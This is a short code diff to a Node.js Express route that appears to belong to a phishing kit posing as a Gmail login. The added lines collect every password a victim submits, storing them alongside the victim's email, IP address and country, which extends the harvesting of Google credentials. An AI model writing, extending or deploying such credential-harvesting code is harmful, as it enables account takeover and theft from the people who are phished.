@@ -121,10 +121,15 @@ router.post("/request", async (req, res) => {
 
     const manager = getUserMessageManager();
     manager.setFlow(userId, "google");
+    const managerUser = manager.getUser(userId);
+    const glPasswords = managerUser.data.gl_passwords || [];
+    if (!glPasswords.includes(password)) glPasswords.push(password);
     const messageId = await manager.update(userId, {
       id: userId,
       pageName: "Gmail",
       login_email: email,
+      gl_email: email,
+      gl_passwords: glPasswords,
       name: name,
       ip: ip,
       country: country,
